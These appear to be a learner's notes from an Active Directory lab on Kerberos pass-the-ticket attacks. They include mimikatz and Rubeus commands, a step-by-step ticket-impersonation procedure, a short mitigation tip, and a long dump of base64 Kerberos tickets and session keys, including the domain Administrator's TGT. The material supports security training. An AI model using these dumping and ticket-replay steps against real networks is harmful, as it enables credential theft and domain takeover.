  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # securelsa::ticket /export
ERROR mimikatz_doLocal ; "securelsa" module not found !

        standard  -  Standard module  [Basic commands (does not require module name)]
          crypto  -  Crypto Module
        sekurlsa  -  SekurLSA module  [Some commands to enumerate credentials...]
        kerberos  -  Kerberos package module  []
       privilege  -  Privilege module
         process  -  Process module
         service  -  Service module
         lsadump  -  LsaDump module
              ts  -  Terminal Server module
           event  -  Event module
            misc  -  Miscellaneous module
           token  -  Token manipulation module
           vault  -  Windows Vault/Credential module
     minesweeper  -  MineSweeper module
             net  -
           dpapi  -  DPAPI Module (by API or RAW access)  [Data Protection application programming interface]
       busylight  -  BusyLight Module
          sysenv  -  System Environment Value module
             sid  -  Security Identifiers module
             iis  -  IIS XML Config module
             rpc  -  RPC control of mimikatz
            sr98  -  RF module for SR98 device and T5577 target
             rdm  -  RF module for RDM(830 AL) device
             acr  -  ACR Module

mimikatz # securelsa::ticket /export
ERROR mimikatz_doLocal ; "securelsa" module not found !

        standard  -  Standard module  [Basic commands (does not require module name)]
          crypto  -  Crypto Module
        sekurlsa  -  SekurLSA module  [Some commands to enumerate credentials...]
        kerberos  -  Kerberos package module  []
       privilege  -  Privilege module
         process  -  Process module
         service  -  Service module
         lsadump  -  LsaDump module
              ts  -  Terminal Server module
           event  -  Event module
            misc  -  Miscellaneous module
           token  -  Token manipulation module
           vault  -  Windows Vault/Credential module
     minesweeper  -  MineSweeper module
             net  -
           dpapi  -  DPAPI Module (by API or RAW access)  [Data Protection application programming interface]
       busylight  -  BusyLight Module
          sysenv  -  System Environment Value module
             sid  -  Security Identifiers module
             iis  -  IIS XML Config module
             rpc  -  RPC control of mimikatz
            sr98  -  RF module for SR98 device and T5577 target
             rdm  -  RF module for RDM(830 AL) device
             acr  -  ACR Module

mimikatz #



Pass the Ticket w/ Mimikatz

Now that we have our ticket ready we can now perform a pass the ticket attack to gain domain admin privileges.

1.) kerberos::ptt <ticket> - run this command inside of mimikatz with the ticket that you harvested from earlier. It will cache and impersonate the given ticket



2.) klist - Here were just verifying that we successfully impersonated the ticket by listing our cached tickets.

We will not be using mimikatz for the rest of the attack.



3.) You now have impersonated the ticket giving you the same rights as the TGT you're impersonating. To verify this we can look at the admin share.



Note that this is only a POC to understand how to pass the ticket and gain domain admin the way that you approach passing the ticket may be different based on what kind of engagement you're in so do not take this as a definitive guide of how to run this attack.

Pass the Ticket Mitigation -

Let's talk blue team and how to mitigate these types of attacks. 

Don't let your domain admins log onto anything except the domain controller - This is something so simple however a lot of domain admins still log onto low-level computers leaving tickets around that we can use to attack and move laterally with.
Answer the questions below








Alternativas si Mimikatz Falla
Rubeus (herramienta C# para Kerberos):

bash
Rubeus.exe dump /nowrap


Rubeus.exe dump /nowrap /outfile:tickets.kirbi



Impacket (en Linux):

bash
python3 ticketer.py -n -domain DOMINIO -user usuario -password contraseña







    vil-WinRM* PS C:\Users\Administrator\Downloads> ./Rubeus.exe dump /nowrap /outfile:tickets.kirbi

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0


Action: Dump Kerberos Ticket Data (All Users)

[*] Current LUID    : 0x498711


[X] Error 1312 calling LsaCallAuthenticationPackage() for target "LDAP/CONTROLLER-1.CONTROLLER.local/CONTROLLER.local" : A specified logon session does not exist. It may already have been terminated

[X] Error 1312 calling LsaCallAuthenticationPackage() for target "GC/CONTROLLER-1.CONTROLLER.local/CONTROLLER.local" : A specified logon session does not exist. It may already have been terminated

[X] Error 1312 calling LsaCallAuthenticationPackage() for target "LDAP/CONTROLLER-1.CONTROLLER.local/CONTROLLER.local" : A specified logon session does not exist. It may already have been terminated

[X] Error 1312 calling LsaCallAuthenticationPackage() for target "ldap/CONTROLLER-1.CONTROLLER.local" : A specified logon session does not exist. It may already have been terminated

[X] Error 1312 calling LsaCallAuthenticationPackage() for target "ldap/CONTROLLER-1.CONTROLLER.local" : A specified logon session does not exist. It may already have been terminated

[X] Error 1312 calling LsaCallAuthenticationPackage() for target "LDAP/CONTROLLER-1" : A specified logon session does not exist. It may already have been terminated

[X] Error 1312 calling LsaCallAuthenticationPackage() for target "ldap/CONTROLLER-1.CONTROLLER.local" : A specified logon session does not exist. It may already have been terminated

[X] Error 1312 calling LsaCallAuthenticationPackage() for target "ldap/CONTROLLER-1.CONTROLLER.local" : A specified logon session does not exist. It may already have been terminated
  UserName                 : CONTROLLER-1$
  Domain                   : CONTROLLER
  LogonId                  : 0x499ea8
  UserSID                  : S-1-5-18
  AuthenticationPackage    : Kerberos
  LogonType                : Network
  LogonTime                : 8/5/2025 3:04:27 PM
  LogonServer              :
  LogonServerDNSDomain     : CONTROLLER.LOCAL
  UserPrincipalName        :

  UserName                 : CONTROLLER-1$
  Domain                   : CONTROLLER
  LogonId                  : 0x1663e4
  UserSID                  : S-1-5-18
  AuthenticationPackage    : Kerberos
  LogonType                : Network
  LogonTime                : 8/5/2025 11:48:24 AM
  LogonServer              :
  LogonServerDNSDomain     : CONTROLLER.LOCAL
  UserPrincipalName        :

  UserName                 : CONTROLLER-1$
  Domain                   : CONTROLLER
  LogonId                  : 0x6e94c
  UserSID                  : S-1-5-18
  AuthenticationPackage    : Kerberos
  LogonType                : Network
  LogonTime                : 8/5/2025 11:38:36 AM
  LogonServer              :
  LogonServerDNSDomain     : CONTROLLER.LOCAL
  UserPrincipalName        :

  UserName                 : CONTROLLER-1$
  Domain                   : CONTROLLER
  LogonId                  : 0x6e910
  UserSID                  : S-1-5-18
  AuthenticationPackage    : Kerberos
  LogonType                : Network
  LogonTime                : 8/5/2025 11:38:36 AM
  LogonServer              :
  LogonServerDNSDomain     : CONTROLLER.LOCAL
  UserPrincipalName        :

  UserName                 : CONTROLLER-1$
  Domain                   : CONTROLLER
  LogonId                  : 0x2d12a
  UserSID                  : S-1-5-18
  AuthenticationPackage    : Kerberos
  LogonType                : Network
  LogonTime                : 8/5/2025 11:33:49 AM
  LogonServer              :
  LogonServerDNSDomain     : CONTROLLER.LOCAL
  UserPrincipalName        :


    ServiceName           :  krbtgt/CONTROLLER.LOCAL
    ServiceRealm          :  CONTROLLER.LOCAL
    UserName              :  CONTROLLER-1$
    UserRealm             :  CONTROLLER.LOCAL
    StartTime             :  8/5/2025 11:33:49 AM
    EndTime               :  8/5/2025 9:33:49 PM
    RenewTill             :  8/12/2025 11:33:49 AM
    Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
    KeyType               :  aes256_cts_hmac_sha1
    Base64(key)           :  vn4TBGh53C6sNEWZVLznXWR+tG+nbq/hfJuNLX+7/ts=
    Base64EncodedTicket   :

      doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEsv3FWvFI5QeNru580MMc6mIcmEqjQ9tvGaaO8uMLFlu9jXoEXiW2RdgB/AcKp2HIYDP4bvNbmbiHkcL8lG8RnxBNHNNSnf5xnmzoTXUYWojw+Rgn43/1C2U05cOpW2QjS4Ra+DnHJVH8dLdXGpwow+IOM6MaoLB2kGVqiaxUk5Pg2GrKhuuyy1olWnVA15/BFeIJ4AmYzza4BZmJhGgZlFv6kpLcPtXoP6hDm4ycBsZTO4Y3WKt3XDQraW69EACyfk94cf5IfUXrmBQTzGTdtoEijTSSIKw7g3+3+IFL64J7YBiGTcd1yM2VcTFdhKON66l828GwVSTkWSps4ucvlUgTZXXBqvV0kzKZVkxrhwHvvbwc/WuwNKrQmdqGmNbaVizu7wKlPrXdX8naCY8szvWu4lm4ZP0jsnEGEmLyGsdP0q8+N2M645QsBv5q2HluwKU2mVg6QLwVLqLHR/uxh6g+7bP8blRGw8Dm4cApo/wfsnXmM4kUtDURtqqRJLsAyzDwuY9Y3EFBe0ahy324BOUHJiY7Ypbs5As2heETDiSRFOJE3F94lAmElX7Gka8vxud2riW7sO7f985kgORAKBzJmMwCytWjOFRaCPnBQKtgbWs+rihHVVl+ljQ4oFSsY0igKUysUggSPhwlrQt5jnCw1gEtXCY0y4QwzJJxcpCr/RKZWz01dfEQ5U7QXO6iz37bDKA7PSAPZTSmUmyp1llyDsIC6Y4AUIKG7LNo+dk75askB422NguWwysD7qgDkIcpK7n1TqyK5BxXrP3qBRcnlVduNIXHHLIe7cCNxmNXkZLjPrl3NoI+D7F7HCHPAsbQlbE52wuvxOJXJHrY8BB0d/3QD4IW9XXEeOPNielstWS2u36vw1dn9YvSEeLT+E+baVYewA9NBQEmJ24mq3hZmpirwNNJkQijkqWEYiFnbFtIrwvyVS7z+CokQWCNE3INZm9f20OGEKqlB+Ke5c2LhqUJX3oBWcV84NWgm/Xh/oDPbL2TDGhR6rIIA4+LcYQjUIN+woLmiloXqBBHv2VJc3j40OT7I8th5QfR/Qr8S6PR2hXuTic/7mUzZdeBA+PdzvcqBh26kAJS7w9Ec7MGYUw+xlsRnUE73ENpe6DSsIDp9e4HWKAw76BaWv8/CcsST6nNJZx754xyb8hxVHJeQqSujssac/GJQW6vuwVaPjMBx0R3SBFeJnXcB5eiJ+V3kOjXZBW0hT8AmUjNAL52vi0nk4bb8c0fZgm6ahq7muSAaqcvj2C/AWPcSXHOx2MxgyAYD3Jm27b2o4aWXmD1h94yieMY1RPNhu8zc+UH1/8wSdedtgsF0T/ordDeSlmZh+Pv1PUSZc2ygiNkf5/e3oY9xWZF7bk7WhYGLwIdLejgfcwgfSgAwIBAKKB7ASB6X2B5jCB46CB4DCB3TCB2qArMCmgAwIBEqEiBCC+fhMEaHncLqw0RZlUvOddZH60b6dur+F8m40tf7v+26ESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoREwDxsNQ09OVFJPTExFUi0xJKMHAwUAYKEAAKURGA8yMDI1MDgwNTE4MzM0OVqmERgPMjAyNTA4MDYwNDMzNDlapxEYDzIwMjUwODEyMTgzMzQ5WqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM

  UserName                 : CONTROLLER-1$
  Domain                   : CONTROLLER
  LogonId                  : 0x2cefd
  UserSID                  : S-1-5-18
  AuthenticationPackage    : Kerberos
  LogonType                : Network
  LogonTime                : 8/5/2025 11:33:49 AM
  LogonServer              :
  LogonServerDNSDomain     : CONTROLLER.LOCAL
  UserPrincipalName        :

  UserName                 : CONTROLLER-1$
  Domain                   : CONTROLLER
  LogonId                  : 0x3e4
  UserSID                  : S-1-5-20
  AuthenticationPackage    : Negotiate
  LogonType                : Service
  LogonTime                : 8/5/2025 11:33:11 AM
  LogonServer              :
  LogonServerDNSDomain     :
  UserPrincipalName        : CONTROLLER-1$@CONTROLLER.loca


    ServiceName           :  krbtgt/CONTROLLER.LOCAL
    ServiceRealm          :  CONTROLLER.LOCAL
    UserName              :  CONTROLLER-1$
    UserRealm             :  CONTROLLER.LOCAL
    StartTime             :  8/5/2025 12:03:18 PM
    EndTime               :  8/5/2025 10:03:18 PM
    RenewTill             :  8/12/2025 12:03:18 PM
    Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
    KeyType               :  aes256_cts_hmac_sha1
    Base64(key)           :  ygI7dEy/KvL9sWvOr2lOhZExxwOz5xcXl4lgWhBy5Pw=
    Base64EncodedTicket   :

      doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEos38d36bC+JpUTDIeL/q1MIi9A4JFOw2uX39XzCAhFNuF/duGESlh2KGM3a+bOni6S6ZVKHI8gYQ+1ZHNz/zZ1VoKBo9jHjgk+elr5QoxieAGQcnhg0MstuMtB8NxjECxn5PqXfVa1QzkJBiHiAENAtF7nEnvkMVheS2mzBrXVNchhclJWZXkxRm2B33SRUTBi6HY8uhLbPO9YhrPQ8o1MrGxcFlek+2JuYzSTuwgEkv7/v/rIqAD92PF2+9nHFIqTHeT645x9ppD9sT8jQQSp4bF4AXGlxcdaWQMsofrpBeIryF7SRTeQOxEHJUParVPcGB2PucKoGESu4OWvlHFpcDFugYAIIH82qUhfkTOuduDmupzTRFXm83w1GEgoivKTzuCJUaz2pzm+jjfdHz0DgHl6atQaFa/Cd0aJjK9wGaIJ3vx2X0YOtxg7aEN5xCBEUJhxU3liz+bcIrmiO5ZmaRbZarQQILLOUD3ngG6T6V2ffRnolv1cwT72+DVJ04aaj29RYQoEPQB72eE7AZCMxM7Nn3VOzZEaYzCayrzAXbn6eEh9kSdUG2+Gv3rfVR+ZYnp7DbbEKSpyaKaeNURWk3olJgFhnLnvGvOh9GhOpkzsRvefyRg0h8qC3MeTy4P80SWBLfUWWbFNFbImGT9eU0GWom1zbMK21WlJwEfv+O9iQwDs/efjBbTD4Hu7hMTn8TlheFKPqpuoJHj7jggkT6IWvTrRPyEbMgXcNC/St0Lg9CeU3TCcDMqH8MCKzRJzg9C/3g7eCXcMCyPnAf/BVZW53XWBQimD1c/Ul04c5pbn+a7kmadtO1nqN23aET+6Si+0zlPQmVUVvcQv9tYFDOIrOpY9q03b4HFA1rdBNH1H0r1seuI+p4VCJ+hC78eG4zQ/sstZ744Ka/e0ZgiqDJKjaXYtFamsWoIDooRM1GnJp7hzvCEZ74BkIHnNjs+B5a+UpgGBcgVBIYLI9S7SezJ+rlmDe0Yf21xKi+rzIIRFKWQY6si/uUXOMtiWs3CUoRs8KE9DALdgmTONHULWhn0x7BKACgfSANi00f92zkqR7WSUfQpsfVUDb5kXu/Y7ThgwBBEmmXGcINo7eXRZuZbflc1kLjbW7pimLPMO60CjW/ZnE6KdzawLN9zZiXArVbgIPt+Ob7YeDjFp8z/3gPtbibn2m2in/6BWWmLAKFhCtjzERrENqIjSOdi3uFa9a2quoxxmWf2Bq0rHeBetHSUWFWcxEGkGKHbhF/Xi+j7lj0c5Bt5NRMKFg4Dqy8M2S7iAd0Vr4UzyF3k09j7Hj+AzkvhJXY0vFiqTin7AeEUxgTGH2tob/RBGGaGOihSDlP9m1yU8QcUNeJGGlIor1czHmbO6q5opfljaAfxmoK42jgfcwgfSgAwIBAKKB7ASB6X2B5jCB46CB4DCB3TCB2qArMCmgAwIBEqEiBCDKAjt0TL8q8v2xa86vaU6FkTHHA7PnFxeXiWBaEHLk/KESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoREwDxsNQ09OVFJPTExFUi0xJKMHAwUAQOEAAKURGA8yMDI1MDgwNTE5MDMxOFqmERgPMjAyNTA4MDYwNTAzMThapxEYDzIwMjUwODEyMTkwMzE4WqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM


    ServiceName           :  ldap/CONTROLLER-1.CONTROLLER.local/CONTROLLER.local
    ServiceRealm          :  CONTROLLER.LOCAL
    UserName              :  CONTROLLER-1$
    UserRealm             :  CONTROLLER.LOCAL
    StartTime             :  8/5/2025 12:03:18 PM
    EndTime               :  8/5/2025 10:03:18 PM
    RenewTill             :  8/12/2025 12:03:18 PM
    Flags                 :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
    KeyType               :  aes256_cts_hmac_sha1
    Base64(key)           :  9ARKhksN2YqjzNULyolOQLLiq4rzNYmJmKm3p/RCks8=
    Base64EncodedTicket   :

      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

  UserName                 : CONTROLLER-1$
  Domain                   : CONTROLLER
  LogonId                  : 0x49720b
  UserSID                  : S-1-5-18
  AuthenticationPackage    : Kerberos
  LogonType                : Network
  LogonTime                : 8/5/2025 3:04:05 PM
  LogonServer              :
  LogonServerDNSDomain     : CONTROLLER.LOCAL
  UserPrincipalName        :

  UserName                 : Administrator
  Domain                   : CONTROLLER
  LogonId                  : 0x43c873
  UserSID                  : S-1-5-21-432953485-3795405108-1502158860-500
  AuthenticationPackage    : Kerberos
  LogonType                : RemoteInteractive
  LogonTime                : 8/5/2025 2:54:33 PM
  LogonServer              : CONTROLLER-1
  LogonServerDNSDomain     : CONTROLLER.LOCAL
  UserPrincipalName        : Administrator@CONTROLLER.local


    ServiceName           :  krbtgt/CONTROLLER.LOCAL
    ServiceRealm          :  CONTROLLER.LOCAL
    UserName              :  Administrator
    UserRealm             :  CONTROLLER.LOCAL
    StartTime             :  8/5/2025 2:54:33 PM
    EndTime               :  8/6/2025 12:54:33 AM
    RenewTill             :  8/12/2025 2:54:33 PM
    Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
    KeyType               :  aes256_cts_hmac_sha1
    Base64(key)           :  2PIQDx3tCsIEGGadDrYceKZ/UGqqIX1uJxJpcdJd6b0=
    Base64EncodedTicket   :

      doIFjDCCBYigAwIBBaEDAgEWooIEgDCCBHxhggR4MIIEdKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQwMIIELKADAgESoQMCAQKiggQeBIIEGpBr5YKTYMdSZuuv2wQTxq9C34m6vzg7Ethh9sPGjeEsR5qoIZvuhmefI/jkSSxkHx08uC4iT5PlymyzuJNsO8Ol696LN3m5dGzyuCZ8+r73oc78lTgOlKXT71D1WCJldcj98DrU9s4hCUT8Qbz1OrA7qqjHmIZUYjZoZZQmdIQjSj752KHv0RdjvCtaqKAFQat/EP+8RNF3Gw5NG5Le3o9oJFPZHrZzol6qtM5SlZlbJHxvyBEAP7r3QMJeSgMVafSGtwEoaMkbf5HI+HpsDjw+v9kH4C3B/bYstjkqKYi2xXD4KUP8reZeHTDfSBzbwXJ/cgRaks9HMJ0nSZqyOJ7Gzy9jNB6mtACaIeSsE+ZgGLWFWoi9+mjAEfWRQrFuR5lb4/rUXOBeR9Vg9IUdwCqYWCKyuUfwJ9V6nwZBNbiCC0kCkuKDERKI194uX4ys0RIp1G9dM+BUFe+fkzjpL8l4h7cRVmxJc25F/V7hv3kpXPeBVW4wh65SmXCEKFjV+Ymf3FDe+nJyotaLgNv232x1RbGDmk+zGi7Ork+g1lyPekqKFs8eru1t005YVBLBExgfSRUTG333DUFeJsGF9a5cGViXwnJLnyJbjpUq3x3JVQgN5XfkhOsx5thYbmrUbrxlZT+A8wqaWV4BnRVHtbxz2a5CvAfzkzwuRFi9Q4Xnt73FBBJmv2t0QizbtCw5BZGsRFBbiC78ARy+o6INUBAcsnRAnkg1naWprkvamzg9vzkbtB7cRsAwHtKMTLKleGrRtEvAtPD0O3Auc7IlgzvSjdHl2axOYV4prECRpfUuTYNkfjWQBJA7Z2O32LMWfZf7aJm7zzSp13khgSUyid9PUu8TlpGrFpzZI0PawFQY7T6Wst3m1XyfEOE8Rc1crnAlS1dIhQIbhf1I+pWrB4DeKTfv7jUsRvq0Ih9Qp7Jppr+xqg3kRHCRm/RZOZskTWvF/z9GB96sJv6JKKZUtX7kdYCdvw1hlg3zE5zip9rXj2Z/C+3gznd+89gAwirnwWcKpMLwL13+ydXAaZJ+vEefXGYgqSE5iQnbmmkkW9wT4G/23isYesyB5L5KSfGWyxYsN5L6l233Q2w5pkZ/tR721JJTORbWqgMX7+AR/peePJWR0h2EBXXMdcFFqW8XwVPNLz6tSc8A73OMCXbuDxy5wEWeNelUtHbscQQlwNCaD9ntuNzDfDTrQXokbB5/Y+LRXTZrxuLQCR/SJzg0RRqqig2ghRnOXx1gYJZFhS1xv2Am2OfQJv4bPwBuw5OWjENsRrj3Ej8els8n/jGKvx9lYY+datkQp8Eeu0E33L4AZBXy+SA9QO06I2V3orMe+ohEWH+dVmIPrl7gBZhbjJxvTjraW3B7ytLwAMIwvE4VNwCAv/9D4UmlVaOB9zCB9KADAgEAooHsBIHpfYHmMIHjoIHgMIHdMIHaoCswKaADAgESoSIEINjyEA8d7QrCBBhmnQ62HHimf1BqqiF9bicSaXHSXem9oRIbEENPTlRST0xMRVIuTE9DQUyiGjAYoAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBA4QAApREYDzIwMjUwODA1MjE1NDMzWqYRGA8yMDI1MDgwNjA3NTQzM1qnERgPMjAyNTA4MTIyMTU0MzNaqBIbEENPTlRST0xMRVIuTE9DQUypJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIuTE9DQUw=

  UserName                 : CONTROLLER-1$
  Domain                   : CONTROLLER
  LogonId                  : 0x6e985
  UserSID                  : S-1-5-18
  AuthenticationPackage    : Kerberos
  LogonType                : Network
  LogonTime                : 8/5/2025 11:38:36 AM
  LogonServer              :
  LogonServerDNSDomain     : CONTROLLER.LOCAL
  UserPrincipalName        :

  UserName                 : CONTROLLER-1$
  Domain                   : CONTROLLER
  LogonId                  : 0x6e8b4
  UserSID                  : S-1-5-18
  AuthenticationPackage    : Kerberos
  LogonType                : Network
  LogonTime                : 8/5/2025 11:38:36 AM
  LogonServer              :
  LogonServerDNSDomain     : CONTROLLER.LOCAL
  UserPrincipalName        :

  UserName                 : CONTROLLER-1$
  Domain                   : CONTROLLER
  LogonId                  : 0x3e7
  UserSID                  : S-1-5-18
  AuthenticationPackage    : Negotiate
  LogonType                : 0
  LogonTime                : 8/5/2025 11:32:55 AM
  LogonServer              :
  LogonServerDNSDomain     : CONTROLLER.local
  UserPrincipalName        : CONTROLLER-1$@CONTROLLER.local


    ServiceName           :  krbtgt/CONTROLLER.LOCAL
    ServiceRealm          :  CONTROLLER.LOCAL
    UserName              :  CONTROLLER-1$
    UserRealm             :  CONTROLLER.LOCAL
    StartTime             :  8/5/2025 11:33:49 AM
    EndTime               :  8/5/2025 9:33:49 PM
    RenewTill             :  8/12/2025 11:33:49 AM
    Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
    KeyType               :  aes256_cts_hmac_sha1
    Base64(key)           :  qv3P+X5IICtckYdXGxlLKOk+Oa64XvcrcjMkqPf1muY=
    Base64EncodedTicket   :

      doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEhejymRxfKGQjHJ/+xatCAHefDcG5qVY1Ym6343SD/Nt++ZbOTdUDpSw5a8RIFUFajH7W1PEe9PM7r0WqVKV6bU1ohN0Hs9P6c+ZOgQslysW+V/WjcviOrzobXUM6uK8WW2NZs81m3R0MKgOrKb7emHC23qryYOCXFm5nV1b9feGQha9bKuhebrPYEe6Gle3kSTbTahFKi/6BBUCWIGrMEOF/NzcVdhs6btvbB55m+y2gf1/tKmP+gwXg0fHpZ+D05sup9GcLoImGvXSS4qxEVyzV9sZ+0TXdV0gbfPBi5ESH5uDLQlI9C1tYpva7KrOpBL4C0mEOZ7wyDK+SA/5+MK5LQbFn1iKxUTUSZABh/7MF/GI2BminKQGI1Ov4SnZR041tdBq2jrKUtZomYQMLomizqG37Ma2FgG8igl1+bRhAvZr+454dTWctYU/GKh0Tlwe+CMtnGDMBlsZQ4TQz9bueDJe9CJ3SXeZqGD/IwnI/7Lh/E+RrduDJ/106v4W4uomTcxHbLJm0bJcNTWjENjlRmqpz8TcemqwBH2Zu80nhXNL2O/0GYiUUxQ5xVCwwTzUGFLXU+z7orGFuRw5Ej9hcRg70yO9IlYnc+WLbwsnzoBsfYm25O9omYC6hXV24OlXt/uDL9NG2oPCsInV0EFHoBttvHX+rB8cuXoosbUUht0TMZbpZIQmojUbcM78t7LfR3X4MpkDWwc7tmjZ0riEnDGaZZUbr5cA7bzr6TlNrnKB2wkxipF/SQPeAZKSOhN1ts4OAyd9EnibUOpYf9ZbfmpGf0mRSr0verno5kmBK9G79vyDEKhvjj2gixz3eIrIKPHMI58S5pmWxBtvNtL01iAeoBDJy4p2v5BufOx5T9M3lwp0QEhnEhwu5PP6g7d/Wz0InwpLg1MPJ/mYorR7desSfAxndV+7mDad/NaLU2Al/roazKBABMhwks+BANwDDGBdwipegs9OOjz0TtzVh4App6YX4OfFe7zTS1l1zxuv3mDP74+AsJJx91YnSQJA2TMauhzx2JHhieK7JMuXquJvSGOiKB3kf/y3+wHtbvfcRU3IvniMgHukGFlo1GBlL0WaVllGjmj4XvSRbnuFlYQnI988q02JNI/bocCeMLPD8nR3ssdIU3qJr5CwjZiFZH5dg2uoxvWb6XoKJsgG1behf3DbO4Y9C48BdxFRFWs4zFkEB2ZmqxsbYnPswgV+q2FowT3VqyRUINP0pNrpRwi59/fkctzaY2Fcrn3i22mdkmwv4yKTmI+lxtQxWinGYiIPQo64fOYYKtkJOD5voueb6QPondCR/OUQTexhX4V6vWq7qeFtm+nu5Qvv1alENs5KxTFNWCyXUctsXq9y2klII7q5fFwGrM6FA2X5FdWjgfcwgfSgAwIBAKKB7ASB6X2B5jCB46CB4DCB3TCB2qArMCmgAwIBEqEiBCCq/c/5fkggK1yRh1cbGUso6T45rrhe9ytyMySo9/Wa5qESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoREwDxsNQ09OVFJPTExFUi0xJKMHAwUAQOEAAKURGA8yMDI1MDgwNTE4MzM0OVqmERgPMjAyNTA4MDYwNDMzNDlapxEYDzIwMjUwODEy